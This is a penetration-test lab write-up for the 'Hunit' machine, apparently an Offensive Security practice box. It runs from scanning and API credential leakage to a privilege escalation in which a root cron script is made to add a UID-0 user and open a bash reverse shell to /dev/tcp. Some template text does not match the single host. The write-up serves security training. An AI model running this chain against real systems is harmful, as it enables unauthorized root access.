# Hunit
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On $Date, $Author performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the $DomainName domain. During the penetration test, $Author was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| $CveIdNumber | $EdbIdNumber |

## Recommendations
$Author recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
$Author used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of $Author's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, $Author was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: hunit 
* Description: Hunit - the goddess of the 26th day of the month.
* IP Address: 192.168.201.125
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Tue Aug 17 20:54:20 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/hunit-nmap-complete 192.168.201.125
Nmap scan report for 192.168.201.125
Host is up (0.086s latency).
Not shown: 65535 open|filtered ports, 65531 filtered ports
PORT      STATE SERVICE
8080/tcp  open  HTTP
12445/tcp open  Samba
18030/tcp open  HTTP
43022/tcp open  SSH

# Nmap done at Tue Aug 17 20:58:37 2021 -- 1 IP address (1 host up) scanned in 257.04 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Tue Aug 17 20:59:16 2021 as: nmap -sV -sC -pT:8080,12445,18030,43022 --min-rate 1000 -oN scans/hunit-nmap-versions 192.168.201.125
Nmap scan report for 192.168.201.125
Host is up (0.11s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Wed, 18 Aug 2021 00:59:23 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 18 Aug 2021 00:59:23 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Wed, 18 Aug 2021 00:59:23 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=8/17%Time=611C5B6C%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r\nDat
SF:e:\x20Wed,\x2018\x20Aug\x202021\x2000:59:23\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x20UP\
SF:n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\x20co
SF:mmercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(html5up\
SF:.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</title>\
SF:n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1,\x20user-scalable=no
SF:\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css\"\x2
SF:0/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t\t<!-
SF:-\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">\n\t\
SF:t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"row\">
SF:\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<header\x2
SF:0id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"logo\">
SF:My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t</div
SF:>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\n\n\t
SF:\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTTPOpti
SF:ons,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-L
SF:ength:\x200\r\nDate:\x20Wed,\x2018\x20Aug\x202021\x2000:59:23\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x20505\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x20465\r\nDate:\x20Wed,\x2018\x20Aug\x202021\x2000:
SF:59:23\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
SF:>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Sup
SF:ported</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,A
SF:rial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-
SF:color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x
SF:20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:blac
SF:k;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</st
SF:yle></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20V
SF:ersion\x20Not\x20Supported</h1></body></html>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 17 21:00:16 2021 -- 1 IP address (1 host up) scanned in 59.16 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Tue Aug 17 21:02:18 2021 as: nmap -O -oN scans/hunit-nmap-os 192.168.201.125
Nmap scan report for 192.168.201.125
Host is up (0.081s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 17 21:02:33 2021 -- 1 IP address (1 host up) scanned in 15.86 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### HTTP
```bash
dirb http://192.168.201.125:8080 -o scans/hunit-8080-common

# output
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/hunit-dirb-8080-common
START_TIME: Tue Aug 17 21:22:03 2021
URL_BASE: http://192.168.201.125:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.201.125:8080/ ----
+ http://192.168.201.125:8080/error (CODE:500|SIZE:105)

-----------------
END_TIME: Tue Aug 17 21:28:15 2021
DOWNLOADED: 4612 - FOUND: 1
```

```bash
dirb http://192.168.201.125:8080 /usr/share/wordlist/dirb/big.txt -o scans/hunit-8080-big

# output

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/hunit-dirb-8080-big
START_TIME: Tue Aug 17 21:29:35 2021
URL_BASE: http://192.168.201.125:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.201.125:8080/ ----

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/hunit-dirb-8080-big
START_TIME: Tue Aug 17 21:29:48 2021
URL_BASE: http://192.168.201.125:8080/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458

---- Scanning URL: http://192.168.201.125:8080/ ----
+ http://192.168.201.125:8080/[ (CODE:400|SIZE:435)
+ http://192.168.201.125:8080/] (CODE:400|SIZE:435)
+ http://192.168.201.125:8080/användare (CODE:400|SIZE:435)
+ http://192.168.201.125:8080/error (CODE:500|SIZE:105)
+ http://192.168.201.125:8080/plain] (CODE:400|SIZE:435)
+ http://192.168.201.125:8080/quote] (CODE:400|SIZE:435)
+ http://192.168.201.125:8080/secci� (CODE:400|SIZE:435)

-----------------
END_TIME: Tue Aug 17 21:57:20 2021
DOWNLOADED: 20458 - FOUND: 7
```

```bash
dirb http://192.168.201.125:18030 /usr/share/wordlists/dirb/big.txt -o scans/hunit-dirb-18030-big

# output

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/hunit-dirb-18030-big
START_TIME: Tue Aug 17 21:44:22 2021
URL_BASE: http://192.168.201.125:18030/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.201.125:18030/ ----
+ http://192.168.201.125:18030/~bin (CODE:403|SIZE:969)                                                                               
+ http://192.168.201.125:18030/~ftp (CODE:403|SIZE:969)                                                                               
+ http://192.168.201.125:18030/~mail (CODE:403|SIZE:969)                                                                              
+ http://192.168.201.125:18030/~nobody (CODE:403|SIZE:969)                                                                            
+ http://192.168.201.125:18030/~root (CODE:403|SIZE:969)                                                                              
                                                                                                                                      
-----------------
END_TIME: Tue Aug 17 22:11:53 2021
DOWNLOADED: 20458 - FOUND: 5
```

```bash
dirsearch -u 192.168.201.125:8080

# output
[22:00:09] Starting: 
[22:00:17] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd                                      
[22:00:17] 400 -  435B  - /a%5c.aspx                                       
[22:00:22] 200 -  148B  - /api/                                                                                               
[22:00:28] 500 -  105B  - /error                                                                                
[22:00:28] 500 -  105B  - /error/      
```

```bash
dirsearch -u 192.168.201.125:18030

# output
[22:05:02] 200 -  886B  - /index.html 
```

```bash
firefox http://192.168.201.125:8080/api/

# output
0
string  "/api/"
id      13

1
string  "/article/"
id      14

2
string  "/article/?"
id      15

3
string  "/user/"
id      16

4
string  "/user/?"
id      17
```

```bash
firefox http://192.168.201.125:8080/api/user/?

# output
login   "rjackson"
password        "yYJcgYqszv4aGQ"
firstname       "Richard"
lastname        "Jackson"
description     "Editor"
id      1

1
login   "jsanchez"
password        "d52cQ1BzyNQycg"
firstname       "Jennifer"
lastname        "Sanchez"
description     "Editor"
id      3

2
login   "dademola"
password        "ExplainSlowQuest110"
firstname       "Derik"
lastname        "Ademola"
description     "Admin"
id      6

3
login   "jwinters"
password        "KTuGcSW6Zxwd0Q"
firstname       "Julie"
lastname        "Winters"
description     "Editor"
id      7

4
login   "jvargas"
password        "OuQ96hcgiM5o9w"
firstname       "James"
lastname        "Vargas"
description     "Editor"
id      10
```

### Samba
```bash
smbclient -L //192.168.201.125/ -p 12445

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        Commander       Disk      Dademola Files
        IPC$            IPC       IPC Service (Samba 4.13.2)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.201.125 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

```bash
cd loot
smbget -R smb://192.168.201.125:12445/Commander

# output
Password for [victor] connecting to //Commander/192.168.201.125: 
Using workgroup WORKGROUP, user victor
smb://192.168.201.125:12445/Commander/25_tailrec_function.kt                                                                           
smb://192.168.201.125:12445/Commander/30_abstract_class.kt                                                                             
smb://192.168.201.125:12445/Commander/48_lazy_keyword.kt                                                                               
smb://192.168.201.125:12445/Commander/24_infix_function.kt                                                                             
smb://192.168.201.125:12445/Commander/52_let_scope_function.kt                                                                         
smb://192.168.201.125:12445/Commander/26_class_and_constructor.kt                                                                      
smb://192.168.201.125:12445/Commander/4_variables_data_types.kt                                                                        
smb://192.168.201.125:12445/Commander/40_arrays.kt                                                                                     
smb://192.168.201.125:12445/Commander/44_filter_map_sorting.kt                                                                         
smb://192.168.201.125:12445/Commander/6_kotlin_basics.kt                                                                               
smb://192.168.201.125:12445/Commander/35_lambdas_higher_order_functions.kt                                                             
smb://192.168.201.125:12445/Commander/5_kotlin_basics.kt                                                                               
smb://192.168.201.125:12445/Commander/43_set_hashset.kt                                                                                
smb://192.168.201.125:12445/Commander/10_if_expression.kt                                                                              
smb://192.168.201.125:12445/Commander/13_while_loop.kt                                                                                 
smb://192.168.201.125:12445/Commander/21_named_parameters.kt                                                                           
smb://192.168.201.125:12445/Commander/42_map_hashmap.kt                                                                                
smb://192.168.201.125:12445/Commander/47_lateinit_keyword.kt                                                                           
smb://192.168.201.125:12445/Commander/41_list.kt                                                                                       
smb://192.168.201.125:12445/Commander/17_functions_basics.kt                                                                           
smb://192.168.201.125:12445/Commander/36_lambdas_example_two.kt                                                                        
smb://192.168.201.125:12445/Commander/myKotlinInteroperability.kt                                                                      
smb://192.168.201.125:12445/Commander/3_comments.kt                                                                                    
smb://192.168.201.125:12445/Commander/1_hello_world.kt                                                                                 
smb://192.168.201.125:12445/Commander/22_extension_function_one.kt                                                                     
smb://192.168.201.125:12445/Commander/51_also_scope_function.kt                                                                        
smb://192.168.201.125:12445/Commander/50_apply_scope_function.kt                                                                       
smb://192.168.201.125:12445/Commander/18_functions_as_expressions.kt                                                                   
smb://192.168.201.125:12445/Commander/45_predicate.kt                                                                                  
smb://192.168.201.125:12445/Commander/37_lambdas_closures.kt                                                                           
smb://192.168.201.125:12445/Commander/12_for_loop.kt                                                                                   
smb://192.168.201.125:12445/Commander/23_extension_function_two.kt                                                                     
smb://192.168.201.125:12445/Commander/10_default_functions.kt                                                                          
smb://192.168.201.125:12445/Commander/27_inheritance.kt                                                                                
smb://192.168.201.125:12445/Commander/49_with_scope_function.kt                                                                        
smb://192.168.201.125:12445/Commander/6_Person.kt                                                                                      
smb://192.168.201.125:12445/Commander/46_null_safety.kt                                                                                
smb://192.168.201.125:12445/Commander/39_with_apply_functions.kt                                                                       
smb://192.168.201.125:12445/Commander/8_string_interpolation.kt                                                                        
smb://192.168.201.125:12445/Commander/31_interface.kt                                                                                  
smb://192.168.201.125:12445/Commander/7_data_types.kt                                                                                  
smb://192.168.201.125:12445/Commander/28_overriding_methods_properties.kt                                                              
smb://192.168.201.125:12445/Commander/2_explore_first_app.kt                                                                           
smb://192.168.201.125:12445/Commander/33_object_declaration.kt                                                                         
smb://192.168.201.125:12445/Commander/53_run_scope_function.kt                                                                         
smb://192.168.201.125:12445/Commander/15_break_keyword.kt                                                                              
smb://192.168.201.125:12445/Commander/14_do_while.kt                                                                                   
smb://192.168.201.125:12445/Commander/32_data_class.kt                                                                                 
smb://192.168.201.125:12445/Commander/11_when_expression.kt                                                                            
smb://192.168.201.125:12445/Commander/38_it_keyword_lambdas.kt                                                                         
smb://192.168.201.125:12445/Commander/MyJavaFile.java                                                                                  
smb://192.168.201.125:12445/Commander/34_companion_object.kt                                                                           
smb://192.168.201.125:12445/Commander/16_continue_keyword.kt                                                                           
smb://192.168.201.125:12445/Commander/9_ranges.kt                                                                                      
smb://192.168.201.125:12445/Commander/29_inheritance_primary_secondary_constructor.kt                                                  
Downloaded 26.33kB in 24 seconds
```

Checking for write-access.
```bash
smbmap -H 192.168.201.125 -P 12445

# output
[!] RPC Authentication error occurred
[!] Authentication error on 192.168.201.125
```

Checking for write-access (yes).  
```bash
cd exploits
touch poo.txt
smbclient //192.168.201.125/Commander -p 12445

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> put poo.txt
putting file poo.txt as \poo.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
# ...snipped...
  poo.txt                             A        0  Tue Aug 17 21:17:38 2021
# ...snipped...
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, $Author was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Credentials
* Operating System
  * dademola:ExplainSlowQuest110

```bash
ssh dademola@192.168.201.125 -p 43022

# output
The authenticity of host '[192.168.201.125]:43022 ([192.168.201.125]:43022)' can't be established.
ECDSA key fingerprint is SHA256:gACaWshEOZmOlWwbZFitcqf2i6nc8Sy1KRDB7F0Zxok.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.201.125]:43022' (ECDSA) to the list of known hosts.
dademola@192.168.201.125's password: # ExplainSlowQuest110
```

```bash
id

# output
uid=1001(dademola) gid=1001(dademola) groups=1001(dademola)
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. $Author added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation

```bash
uname -a

# output
Linux hunit 5.9.4-arch1-1 #1 SMP PREEMPT Wed, 04 Nov 2020 21:41:09 +0000 x86_64 GNU/Linux
```

```bash
sudo -l

# output
-bash: sudo: command not found
```

```bash
cat /etc/passwd

# output
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
dhcpcd:x:977:977:dhcpcd privilege separation:/:/usr/bin/nologin
dademola:x:1001:1001::/home/dademola:/bin/bash
git:x:1005:1005::/home/git:/usr/bin/git-shell
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
```

```bash
ps aux | grep root | grep -v "\["

# output
root           1  0.0  0.2  28288 11348 ?        Ss   00:49   0:00 /sbin/init
root         225  0.0  0.4  55448 18012 ?        Ss   00:49   0:00 /usr/lib/systemd/systemd-journald
root         234  0.0  0.2  33268  9352 ?        Ss   00:49   0:00 /usr/lib/systemd/systemd-udevd
root         301  0.0  0.0   3648  2196 ?        Ss   00:49   0:00 /usr/bin/crond -n
root         305  0.0  0.2  19048  8716 ?        Ss   00:49   0:00 /usr/lib/systemd/systemd-logind
root         306  0.0  0.1 232232  6804 ?        Ssl  00:49   0:03 /usr/bin/vmtoolsd
root         362  0.0  0.1   6568  5304 ?        Ss   00:49   0:00 /usr/bin/httpd -k start -DFOREGROUND
root         366  0.0  0.0   2476  1732 tty1     Ss+  00:49   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         463  0.0  0.6  84936 26336 ?        Ss   00:50   0:00 /usr/bin/smbd --foreground --no-process-group -p12445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
root         481  0.0  0.2  82696  9464 ?        S    00:50   0:00 /usr/bin/smbd --foreground --no-process-group -p12445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
root         482  0.0  0.1  82704  5800 ?        S    00:50   0:00 /usr/bin/smbd --foreground --no-process-group -p12445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
root         483  0.0  0.2  84920 10016 ?        S    00:50   0:00 /usr/bin/smbd --foreground --no-process-group -p12445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
dademola    1338  0.0  0.0   3088   788 pts/0    R+   02:34   0:00 grep root
```

```bash
cd /etc/
ls -al

# output
# ...snipped...
drwxr-xr-x  3 root root   4096 Nov  6  2020 samba
# ...snipped...
```

```bash
ls -al samba

# output
total 16
drwxr-xr-x  3 root root 4096 Nov  6  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
drwx------  2 root root 4096 Nov  4  2020 private
-rw-r--r--  1 root root  175 Nov  6  2020 smb.conf
```

```bash
cd samba
cat smb.conf

# output 
[Commander]
    comment = Dademola Files
    path = /home/dademola/shared
    public = yes
    writable = yes
    browsable = yes
    read only = no
    force user = dademola
```

```bash
pacman -Qe

# output
apache 2.4.46-3
base 2-2
cronie 1.5.5-1
dhcpcd 9.3.1-1
efibootmgr 17-2
git 2.29.2-1
grub 2:2.04-8
jdk11-openjdk 11.0.8.u10-1
linux 5.9.4.arch1-1
linux-firmware 20201023.dae4b4c-1
net-tools 1.60.20181103git-2
open-vm-tools 6:11.2.0-1
openssh 8.4p1-2
samba 4.13.2-1
unzip 6.0-14
vi 1:070224-4
vim 8.2.1704-1
wget 1.20.3-3
zip 3.0-9
```

```bash
cat /etc/crontab.bak 

# output
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

```bash
ls -al /home

# output
total 16
drwxr-xr-x  4 root     root     4096 Nov  5  2020 .
drwxr-xr-x 18 root     root     4096 Nov 10  2020 ..
drwx------  7 dademola dademola 4096 Aug 18 03:19 dademola
drwxr-xr-x  4 git      git      4096 Nov  5  2020 git
```

```bash
ls -al /home/git

# output
total 28
drwxr-xr-x 4 git  git  4096 Nov  5  2020 .
drwxr-xr-x 4 root root 4096 Nov  5  2020 ..
-rw------- 1 git  git     0 Jan 15  2021 .bash_history
-rw-r--r-- 1 git  git    21 Aug  9  2020 .bash_logout
-rw-r--r-- 1 git  git    57 Aug  9  2020 .bash_profile
-rw-r--r-- 1 git  git   141 Aug  9  2020 .bashrc
drwxr-xr-x 2 git  git  4096 Nov  5  2020 .ssh
drwxr-xr-x 2 git  git  4096 Nov  5  2020 git-shell-commands
```

```bash
ls -al /home/git/.ssh

# output
total 20
drwxr-xr-x 2 git  git  4096 Nov  5  2020 .
drwxr-xr-x 4 git  git  4096 Nov  5  2020 ..
-rwxr-xr-x 1 root root  564 Nov  5  2020 authorized_keys
-rwxr-xr-x 1 root root 2590 Nov  5  2020 id_rsa
-rwxr-xr-x 1 root root  564 Nov  5  2020 id_rsa.pub
```

```bash
ssh -i .ssh/id_rsa git@localhost -p 43022

# output
Last login: Wed Aug 18 03:25:37 2021 from 127.0.0.1
git> 
```

```bash
ls -al /git-server/

# output
total 40
drwxr-xr-x  7 git  git  4096 Nov  6  2020 .
drwxr-xr-x 18 root root 4096 Nov 10  2020 ..
-rw-r--r--  1 git  git    23 Nov  5  2020 HEAD
drwxr-xr-x  2 git  git  4096 Nov  5  2020 branches
-rw-r--r--  1 git  git    66 Nov  5  2020 config
-rw-r--r--  1 git  git    73 Nov  5  2020 description
drwxr-xr-x  2 git  git  4096 Nov  5  2020 hooks
drwxr-xr-x  2 git  git  4096 Nov  5  2020 info
drwxr-xr-x 16 git  git  4096 Nov  6  2020 objects
drwxr-xr-x  4 git  git  4096 Nov  5  2020 refs
```

```bash
cat /git-server/description

# output
Unnamed repository; edit this file 'description' to name the repository.
```

```bash
cd exploits
git config --global user.name "victor"
git config --global user.email "victor@pwn.edu"
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git clone git@192.168.201.125:/git-server

# output
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

```bash
ls -al ./git-server 

# output
total 20
drwxr-xr-x 3 victor victor 4096 Aug 18 22:22 .
drwxr-xr-x 3 victor victor 4096 Aug 18 22:21 ..
-rw-r--r-- 1 victor victor  121 Aug 18 22:23 backups.sh # <--- not executable...yet
drwxr-xr-x 8 victor victor 4096 Aug 18 22:21 .git
-rw-r--r-- 1 victor victor    0 Aug 18 22:21 NEW_CHANGE
-rw-r--r-- 1 victor victor   63 Aug 18 22:21 README
```

```bash
cat ./git-server/backups.sh

# output
#!/bin/bash
#
#
# # Placeholder
#
```

```bash
cd git-server
echo "useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor" >> backups.sh
echo "/bin/bash -i >& /dev/tcp/192.168.49.201/43022 0>&1" >> backups.sh
chmod +x backups.sh
```

```bash
git add -A
git commit -m "Updated backups.sh"

# output
[master 198b499] Updated backups.sh
 1 file changed, 1 insertion(+)
```

```bash
GIT_SSH_COMMAND='ssh -i ../../id_rsa -p 43022' git push origin master

# output
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 320 bytes | 320.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.201.125:/git-server
   b50f4e5..198b499  master -> master
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, $Author removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Lessons Learned
* Use multiple tools
